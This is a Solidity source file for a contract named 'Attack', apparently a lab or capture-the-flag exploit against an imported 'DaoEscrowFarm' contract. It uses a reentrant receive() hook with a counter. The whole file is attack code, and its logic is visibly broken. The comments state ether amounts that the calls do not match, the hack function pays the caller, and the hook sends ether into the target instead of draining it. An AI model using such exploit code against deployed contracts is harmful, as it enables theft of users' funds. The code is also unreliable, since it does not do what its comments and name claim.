//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.17;
import "./DaoEscrowFarm.sol";
contract Attack {
    address payable public daoAddress;
    uint8 public attackExecuted;

    constructor(address payable _contractAddress) payable {
        daoAddress = _contractAddress;
        attackExecuted = 0;
    }

    function hackContract() external {
        // Send .3 ether; no refund. .6 left
        (bool success,) = msg.sender.call{value: .4 ether}("");
        require(success, "Attacker: ETH_TRANSFER_FAIL"); 
       (success,) = msg.sender.call{value: .7 ether}("");
       require(success, "Attacker: ETH_TRANSFER_FAIL");      
        
    }

    function depositOnce() external returns(bool){
        (bool success,) = daoAddress.call{value: .5 ether}("");
        return success;     
    }

    receive() external payable {
        // upon receiving refund, immediately send more ether
        if (attackExecuted < 2) {
            (bool success,) = daoAddress.call{value: .7 ether}("");
            require(success, "Attacker: ETH_TRANSFER_FAIL"); 
            attackExecuted++; 
        }
        
    }  
}